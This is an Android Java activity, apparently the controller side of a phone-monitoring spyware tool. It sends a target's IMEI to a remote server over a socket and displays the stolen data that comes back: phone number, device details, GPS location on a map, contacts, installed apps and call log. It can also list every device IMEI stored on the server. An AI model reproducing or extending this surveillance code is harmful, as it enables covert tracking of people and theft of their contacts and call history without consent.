package com.lu.mbcontrol;

import android.content.Intent;
import android.provider.ContactsContract;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.amap.api.maps2d.AMap;
import com.amap.api.maps2d.CameraUpdateFactory;
import com.amap.api.maps2d.MapView;
import com.amap.api.maps2d.model.BitmapDescriptor;
import com.amap.api.maps2d.model.BitmapDescriptorFactory;
import com.amap.api.maps2d.model.LatLng;
import com.amap.api.maps2d.model.MarkerOptions;
import com.lu.mbcontrol.utils.SocketAddress;
import com.lu.mbcontrol.utils.SoundPlay;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;

public class DataSerachActivity extends AppCompatActivity {
    private long firstTime = 0;
    private EditText et_IMEI;
    private Button bt_serach, bt_changPage2dunction, bt_changePage2shop,bt_changePage2netCode;
    private LinearLayout lin_IMEI,lin_conAndapp;
    private TextView tv_page, tv_imei,tv_phoneNumber,tv_p_tip,tv_factory,tv_f_tip,tv_model,tv_m_tip,tv_version,tv_v_tip,
            tv_operator,tv_o_tip,tv_l_tip,tv_location,tv_map,tv_call,tv_call_tip, tv_contacts,tv_c_tip,tv_appInstalled,tv_a_tip,tv_a_click, tv_imei_list;
    private String returnData = "nodata";
    private String IMEI;
    private String AllMEI="noIMEI";
    private String phonenumber,factory,model,systemVersion,operator,location,usesContacts,appInstalled,callList,datatime;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_data_serach);
        initView();
        final Bundle mysavedInstanceState = savedInstanceState;
        bt_serach.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                IMEI = et_IMEI.getText().toString();
                SoundPlay.initSoundPool(getApplicationContext());
                if(!IMEI.isEmpty()){
                    new Thread(DownloadRunnable).start();
                    updata();
                }else{
                    Toast.makeText(DataSerachActivity.this, "请输入IMEI进行查询操作", Toast.LENGTH_SHORT).show();
                }
            }
        });
        bt_changPage2dunction.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                Intent intent = new Intent(DataSerachActivity.this, FunctionActivity.class);
                startActivity(intent);
                finish();
            }
        });
        bt_changePage2netCode.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                Intent intent = new Intent(DataSerachActivity.this, NetCodeActivity.class);
                startActivity(intent);
                finish();
            }
        });
        bt_changePage2shop.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                Intent intent = new Intent(DataSerachActivity.this, tiantiantejiaActivity.class);
                startActivity(intent);
                finish();
            }
        });

        tv_imei.setOnLongClickListener(new View.OnLongClickListener() {
            @Override
            public boolean onLongClick(View v) {
                new Thread(viewAllIMEIThread).start();
                IMEIDialog();
                return false;
            }
        });
        tv_map.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
            mapDialog(mysavedInstanceState);
            }
        });
        tv_a_click.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                appDialog();
            }
        });
        tv_page.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                startActivity(new Intent(DataSerachActivity.this,LoginActivity.class));
                finish();
            }
        });
    }

    /**
     * 更新界面数据
     */
    public void updata(){
        Log.e("in updata()","before work");
        clearView();
        while(true){
            if(!returnData.equals("nodata")) {
                Log.e("ops", "nodata");
                break;
            }
        }
        if(returnData.equals("noFile")){
            returnData = "nodata";
            Toast.makeText(this, "没有数据，检查识别码格式", Toast.LENGTH_SHORT).show();
        }else{
            try {
                Log.e("in settext,字符长度：", returnData.length()+"");
                JSONObject jbj = new JSONObject(returnData);
                returnData = "nodata";

                lin_IMEI.setBackgroundResource(R.drawable.shape2);
                lin_conAndapp.setBackgroundResource(R.drawable.shape);

                phonenumber = jbj.getString("PhoneNumber");
                tv_p_tip.setText("手机号：");
                tv_phoneNumber.setText(phonenumber);

                factory = jbj.getString("PhoneFactory");
                tv_f_tip.setText("手机厂商：");
                tv_factory.setText(factory);

                model = jbj.getString("PhoneModel");
                tv_m_tip.setText("手机型号：");
                tv_model.setText(model);

                systemVersion = jbj.getString("Version");
                tv_v_tip.setText("系统版本号：");
                tv_version.setText(systemVersion);

                operator = jbj.getString("Opreator");
                tv_o_tip.setText("运营商：");
                tv_operator.setText(operator);

                location = jbj.getString("Latitude")+","+jbj.getString("Longitude");
                tv_l_tip.setText("用户位置：");
                tv_location.setText(location);
                tv_map.setText("在地图中查看");

                usesContacts =jbj.getString("UserContacts");
                usesContacts = usesContacts.replace(", ","\n");
                tv_c_tip.setText("用户通讯录：");
                tv_contacts.setText(usesContacts);
                tv_contacts.setTextIsSelectable(true);

                appInstalled = jbj.getString("AppInstalled");
                tv_a_tip.setText("用户APP：");
                tv_appInstalled.setText(appInstalled.substring(0,20)+"...");
                tv_a_click.setText("查看全部");

                callList = jbj.getString("CallLog");
                callList = callList.replace(":","\n");
                callList = callList.replace(", ","\n*\n");
                tv_call_tip.setText("通话记录：");
                tv_call.setText(callList);

                datatime = jbj.getString("Time");

                Toast.makeText(this, "查询成功！\n"+"数据更新时间："+datatime, Toast.LENGTH_SHORT).show();

            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        Log.e("in updata()","after work");
    }

    /**
     * 初始化界面
     */
    public void initView(){
        lin_IMEI = (LinearLayout)findViewById(R.id.Lin2_phoneIMEI);
        lin_conAndapp = (LinearLayout)findViewById(R.id.Lin2_ConAndCall);
        et_IMEI = (EditText)findViewById(R.id.ET_IMEI);
        bt_serach = (Button)findViewById(R.id.BT_serach);
        bt_changPage2dunction = (Button)findViewById(R.id.BT_changePage2send_dataSearch);
        bt_changePage2shop = (Button)findViewById(R.id.BT_changePage2shop_dataSearch);
        bt_changePage2netCode = (Button)findViewById(R.id.BT_changePage2netCode_dataSearch);
        tv_page = (TextView)findViewById(R.id.TV_page_serach);
        tv_phoneNumber = (TextView)findViewById(R.id.TV_phoneNumber);
        tv_factory = (TextView)findViewById(R.id.TV_factory);
        tv_model = (TextView)findViewById(R.id.TV_model);
        tv_version = (TextView)findViewById(R.id.TV_version);
        tv_operator = (TextView)findViewById(R.id.TV_operator);
        tv_location = (TextView)findViewById(R.id.TV_location);
        tv_map = (TextView)findViewById(R.id.TV_map);
        tv_contacts = (TextView)findViewById(R.id.TV_contacts);
        tv_contacts.setMovementMethod(ScrollingMovementMethod.getInstance());
        tv_appInstalled = (TextView)findViewById(R.id.TV_appInstalled);
        tv_call = (TextView)findViewById(R.id.TV_callLog);
        tv_call.setMovementMethod(ScrollingMovementMethod.getInstance());
        tv_p_tip = (TextView)findViewById(R.id.TV_phoneNumber_tip);
        tv_f_tip = (TextView)findViewById(R.id.TV_factory_tip);
        tv_m_tip = (TextView)findViewById(R.id.TV_model_tip);
        tv_v_tip = (TextView)findViewById(R.id.TV_version_tip);
        tv_o_tip = (TextView)findViewById(R.id.TV_operator_tip);
        tv_l_tip = (TextView)findViewById(R.id.TV_location_tip);
        tv_c_tip = (TextView)findViewById(R.id.TV_contacts_tip);
        tv_a_tip = (TextView)findViewById(R.id.TV_appInstalled_tip);
        tv_call_tip = (TextView)findViewById(R.id.TV_callLog_tip);
        tv_a_click = (TextView)findViewById(R.id.TV_appclick);
        tv_imei = (TextView)findViewById(R.id.TV_IMEI);
    }

    /**
     * 清空界面
     */
    public void clearView(){
        Log.e("in clearView()","before work");
        tv_p_tip.setText("");
        tv_phoneNumber.setText("");
        tv_f_tip.setText("");
        tv_factory.setText("");
        tv_m_tip.setText("");
        tv_model.setText("");
        tv_v_tip.setText("");
        tv_version.setText("");
        tv_o_tip.setText("");
        tv_operator.setText("");
        tv_l_tip.setText("");
        tv_location.setText("");
        tv_map.setText("");
        tv_c_tip.setText("");
        tv_contacts.setText("");
        tv_a_tip.setText("");
        tv_appInstalled.setText("");
        tv_call.setText("");
        tv_call_tip.setText("");
        tv_a_click.setText("");
        lin_IMEI.setBackgroundResource(R.drawable.shape3);
        lin_conAndapp.setBackgroundResource(R.drawable.shape3);
        Log.e("in clearView()","after work");
    }

    /**
     * 显示位置地图
     * @param savedInstanceState
     */
    public void mapDialog(Bundle savedInstanceState){
        MapView mMapView ;
        AMap aMap ;
        BitmapDescriptor markerIcon;

        String[] slocal = location.split(",");
        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(DataSerachActivity.this);
        builder.setTitle("上一次更新的用户位置");
        View view = LayoutInflater.from(DataSerachActivity.this).inflate(R.layout.layout_map, null);
        builder.setView(view);
        mMapView = (MapView)view.findViewById(R.id.map);
        mMapView.onCreate(savedInstanceState);

        LatLng latLng = new LatLng( Double.parseDouble(slocal[0]),  Double.parseDouble(slocal[1]));
        Log.e("latLng =",Double.parseDouble(slocal[0])+","+Double.parseDouble(slocal[1]));
        aMap = mMapView.getMap();

        markerIcon= BitmapDescriptorFactory.fromResource(R.drawable.markericon);
        MarkerOptions markerOptions = new MarkerOptions();
        markerOptions.icon(markerIcon);
        markerOptions.position(latLng);
        aMap.addMarker(markerOptions);
        aMap.moveCamera(CameraUpdateFactory.changeLatLng(latLng));
        aMap.moveCamera(CameraUpdateFactory.zoomTo(16));
        builder.show();
    }

    /**
     * socket线程
     */
    Runnable DownloadRunnable = new Runnable() {
        @Override
        public void run() {
            Socket socket = null;
                try {
                    socket = new Socket(SocketAddress.SOCKET_ADDRESS, SocketAddress.PORT);
                    JSONObject jsonobj = new JSONObject();
                    jsonobj.put("ID", "control");
                    jsonobj.put("datatype","normaldata");
                    jsonobj.put("IMEI", IMEI);
                    String data = jsonobj.toString();
                    OutputStream outputStream = socket.getOutputStream();//获取一个输出流，向服务端发送信息
                    PrintWriter printWriter = new PrintWriter(outputStream);//将输出流包装成打印流
                    printWriter.print(data);
                    printWriter.flush();
                    socket.shutdownOutput();

                    InputStream inputStream = socket.getInputStream();//获取一个输入流，接收服务端的信息
                    InputStreamReader inputStreamReader = new InputStreamReader(inputStream, "GB2312");//包装成字符流，提高效率
                    BufferedReader bufferedReader = new BufferedReader(inputStreamReader);//缓冲区
                    String info = "";
                    String temp = null;
                    Log.e("log3", "in socket");
                    while ((temp = bufferedReader.readLine()) != null) {
                        info += temp;
                    }

                    returnData = info;

                    Log.e("服务端说：", returnData);
                    Log.e("log5", "in socket");
                    bufferedReader.close();
                    inputStream.close();
                    socket.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }

        }
    };

    Runnable viewAllIMEIThread = new Runnable() {
        @Override
        public void run() {
            Socket socket = null;
            try {
                socket = new Socket(SocketAddress.SOCKET_ADDRESS, SocketAddress.PORT);
                JSONObject jsonobj = new JSONObject();
                jsonobj.put("ID", "control");
                jsonobj.put("datatype","requestIMEI");
                String data = jsonobj.toString();
                OutputStream outputStream = socket.getOutputStream();//获取一个输出流，向服务端发送信息
                PrintWriter printWriter = new PrintWriter(outputStream);//将输出流包装成打印流
                printWriter.print(data);
                printWriter.flush();
                socket.shutdownOutput();

                InputStream inputStream = socket.getInputStream();//获取一个输入流，接收服务端的信息
                InputStreamReader inputStreamReader = new InputStreamReader(inputStream, "GB2312");//包装成字符流，提高效率
                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);//缓冲区
                String info = "";
                String temp = null;
                Log.e("log3", "in socket");
                while ((temp = bufferedReader.readLine()) != null) {
                    info += temp;
                }

                AllMEI = info;
                Log.e("服务端说：", AllMEI);
                Log.e("log5", "in socket");
                bufferedReader.close();
                inputStream.close();
                socket.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };

    /**
     * 显示全部应用
     */
    public void appDialog(){
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("所有已安装应用");
        builder.setMessage(appInstalled.replace(", ", "\n"));
        builder.show();
    }

    /**
     * 显示所有
     */
    public void IMEIDialog(){
        while(true){
            if(!AllMEI.equals("noIMEI")){
                break;
            }
        }
        Toast.makeText(this, "查询成功", Toast.LENGTH_SHORT).show();
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("服务端IMEI列表");
        View view = LayoutInflater.from(DataSerachActivity.this).inflate(R.layout.imei_list, null);
        builder.setView(view);
        tv_imei_list = (TextView)view.findViewById(R.id.TV_IMEI_list);
        tv_imei_list.setText(AllMEI.replace(",","\n\n"));
        tv_imei_list.setTextIsSelectable(true);

        builder.show();
    }
    /**
     * 双击返回键退出
     * @param keyCode
     * @param event
     * @return
     */
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && event.getAction() == KeyEvent.ACTION_DOWN) {
            long secondTime = System.currentTimeMillis();
            if (secondTime - firstTime > 2000) {
                Toast.makeText(DataSerachActivity.this, "再按一次退出", Toast.LENGTH_SHORT).show();
                firstTime = secondTime;
                return true;
            } else {
                finish();
            }
        }
        return super.onKeyDown(keyCode, event);
    }
}
